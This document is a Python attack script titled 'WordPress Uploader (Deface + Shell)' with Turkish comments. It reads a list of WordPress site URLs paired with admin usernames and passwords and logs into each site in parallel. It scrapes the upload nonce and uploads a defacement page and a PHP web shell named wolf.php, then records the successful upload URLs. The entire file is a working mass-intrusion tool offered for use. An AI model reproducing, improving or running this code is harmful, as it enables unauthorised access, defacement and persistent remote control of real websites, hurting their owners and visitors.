# WordPress Uploader (Deface + Shell)
# Author: knk
# Usage: python3 uplaoder.py list.txt

import requests, sys, os, re, json, urllib3
from multiprocessing.dummy import Pool
from colorama import Fore, init

# HTTPS uyarılarını kapat
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)
fr, fg, fc = Fore.RED, Fore.GREEN, Fore.CYAN

threads = 15
deface_file = "deface.html"
shell_file  = "wolf.php"

if not os.path.exists(deface_file):
    sys.exit(f"{fr}[!] {deface_file} bulunamadı!")

try:
    targets = [x.strip() for x in open(sys.argv[1])]
except:
    sys.exit(f"\n{fc}[!] Usage: python3 {sys.argv[0]} list.txt\n"
             f"Format: http://site.com:admin:password")

def wp_upload(line):
    try:
        url, user, pwd = line.rsplit(":", 2)
        sess = requests.Session()

        # --- LOGIN ---
        login_page = sess.get(url + "/wp-login.php", timeout=15, verify=False)
        payload = {"log": user, "pwd": pwd, "wp-submit": "Log In"}
        hidden_fields = re.findall(r'name=["\']([^"\']+)["\'] value=["\']([^"\']*)["\']', login_page.text)
        for name, val in hidden_fields:
            if name not in payload:
                payload[name] = val
        r = sess.post(url + "/wp-login.php", data=payload, allow_redirects=True, timeout=15, verify=False)
        if "wp-admin" not in r.text.lower():
            print(f"{fr}[FAIL] Login -> {url}")
            return

        # --- GET NONCE ---
        media_page = sess.get(url + "/wp-admin/media-new.php", timeout=15, verify=False)
        nonce_match = re.search(r'name="_wpnonce" value="([^"]+)"', media_page.text)
        if not nonce_match:
            print(f"{fr}[FAIL] Nonce -> {url}")
            return
        wpnonce = nonce_match.group(1)

        def do_upload(file_to_upload):
            upload_url = url + "/wp-admin/async-upload.php"
            files = {"async-upload": open(file_to_upload, "rb")}
            data = {"name": os.path.basename(file_to_upload), "action": "upload-attachment", "_wpnonce": wpnonce}
            r = sess.post(upload_url, files=files, data=data, timeout=15, verify=False)
            if r.status_code == 200:
                try:
                    j = r.json()
                    if j.get("success") and "data" in j and "url" in j["data"]:
                        return j["data"]["url"]
                except:
                    match = re.search(r'https?://[^"\']+' + re.escape(os.path.basename(file_to_upload)), r.text)
                    if match:
                        return match.group(0)
            return None

        # --- DEFACE UPLOAD ---
        deface_url = do_upload(deface_file)
        if deface_url:
            print(f"{fg}[UPLOADED] Deface -> {deface_url}")
            open("success.txt", "a").write(deface_url + "\n")
        else:
            print(f"{fr}[FAIL] Deface -> {url}")

        # --- SHELL UPLOAD (if wolf.php exists) ---
        if os.path.exists(shell_file):
            shell_url = do_upload(shell_file)
            if shell_url:
                print(f"{fg}[UPLOADED] Shell -> {shell_url}")
                open("success_shell.txt", "a").write(shell_url + "\n")
            else:
                print(f"{fr}[FAIL] Shell -> {url}")

    except Exception as e:
        print(f"{fr}[ERROR] -> {line.strip()} ({e})")

mp = Pool(threads)
mp.map(wp_upload, targets)
mp.close()
mp.join()

print(f"\n{fc}[!] Finished. Deface -> success.txt | Shell -> success_shell.txt")
